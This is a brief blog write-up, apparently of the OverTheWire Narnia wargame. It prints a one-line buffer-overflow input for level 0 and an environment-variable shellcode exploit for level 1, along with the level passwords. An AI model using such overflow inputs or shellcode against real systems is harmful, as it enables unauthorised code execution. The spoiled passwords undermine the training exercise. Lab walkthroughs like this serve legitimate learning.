---
title: "OverTheWire: Narnia"
date: 2017-05-24T03:10:36.500Z
tags: [medium-blog]
---

<article class="h-entry">
  <section data-field="body" class="e-content">
    <section name="6f76" class="section section--body section--first section--last">
      <div class="section-content">
        <div class="section-inner sectionLayout--insetColumn">
          <h3 name="1811" id="1811" class="graf graf--h3 graf-after--h3">Level 0: Simple Buffer Overflow</h3>
          <p name="0218" id="0218" class="graf graf--p graf-after--h3">We’re given a buffer of 20 characters and an
            int. The program reads 24 characters from input, exactly overwriting the int. The exploit code:</p>
          <pre name="47f8" id="47f8"
            class="graf graf--pre graf-after--p">(python -c ‘print “\xef\xbe\xad\xde” * 6’; cat) | ./narnia0</pre>
          <p name="b867" id="b867" class="graf graf--p graf-after--pre">The password for level 1 is <code
              class="markup--code markup--p-code">efeidiedae</code>.</p>
          <h3 name="59e6" id="59e6" class="graf graf--h3 graf-after--p">Level 1: Executing Shellcode</h3>
          <p name="d660" id="d660" class="graf graf--p graf-after--h3">The program we’re given will execute anything
            at the environment variable <code class="markup--code markup--p-code">EGG</code> as a function pointer; I
            found some shellcode from google and it worked. The exploit code:</p>
          <pre name="a253" id="a253"
            class="graf graf--pre graf-after--p">EGG=$(printf “\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\x<br>ff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81”) bash -c ‘./narnia1’</pre>
          <p name="5af8" id="5af8" class="graf graf--p graf-after--pre">The password for level 2 is <code
              class="markup--code markup--p-code">nairiepecu</code>.</p>
          <p name="3a3b" id="3a3b" class="graf graf--p graf-after--p">Level 2</p>
          <p name="ce56" id="ce56" class="graf graf--p graf-after--p graf--trailing">soon lol</p>
        </div>
      </div>
    </section>
  </section>
  <footer>
    <p>By <a href="https://medium.com/@failedxyz" class="p-author h-card">Michael Zhang</a> on <a
        href="https://medium.com/p/a282ef43b705"><time class="dt-published" datetime="2017-05-24T03:10:36.500Z">May
          24, 2017</time></a>.</p>
    <p><a href="https://medium.com/@failedxyz/overthewire-narnia-a282ef43b705" class="p-canonical">Canonical link</a>
    </p>
    <p>Exported from <a href="https://medium.com">Medium</a> on October 8, 2024.</p>
  </footer>
</article>
